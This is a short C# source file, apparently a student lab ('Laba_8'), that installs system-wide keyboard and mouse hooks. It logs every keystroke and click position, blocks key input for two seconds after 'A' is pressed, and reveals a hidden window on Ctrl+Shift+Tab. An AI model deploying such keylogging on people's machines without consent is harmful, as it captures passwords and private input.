using Gma.System.MouseKeyHook;
using System.Windows.Forms;
using System.Diagnostics;
//using System.Timers;
using System.Threading;
using System;

namespace Laba_8
{
    public class GlobalHooks
    {
        public delegate void WindowShowHandler();

        private readonly IKeyboardMouseEvents _globalHooks = Hook.GlobalEvents();
        private readonly Logger _logger;
        private readonly Settings _settings;
        private readonly WindowShowHandler _windowShow;
        private readonly Stopwatch _tick;

        public GlobalHooks(Settings config, WindowShowHandler windowShow)
        {
            _settings = config;
            _windowShow = windowShow;
            _logger = new Logger(_settings);
            _globalHooks.KeyDown += KeyEvent;
            _globalHooks.MouseClick += MouseEvent;
            _tick = new Stopwatch();
        }
        private void KeyEvent(object sender, KeyEventArgs e)
        {
            if (_settings.IsHooks)
            {
                if (e.KeyData == (Keys.A))
                {
                    _tick.Restart();
                }

                if (_tick.IsRunning && _tick.Elapsed.Seconds < 2)
                {
                    e.SuppressKeyPress = true;
                }

                if (_tick.IsRunning && _tick.Elapsed.Seconds > 2)
                {
                    _tick.Stop();
                }

                _logger.KeyLogger(e.KeyData.ToString());
            }
            if (e.KeyData == (Keys.Control | Keys.Shift | Keys.Tab))
            {
                if (_windowShow != null)
                {
                    _windowShow.Invoke();
                }
            }
        }

        private void MouseEvent(object sender, MouseEventArgs e)
        {
            if (_settings.IsHooks)
            {
                _logger.MouseLogger(e.Button.ToString(), e.Location.ToString());
            }
        }
    }
}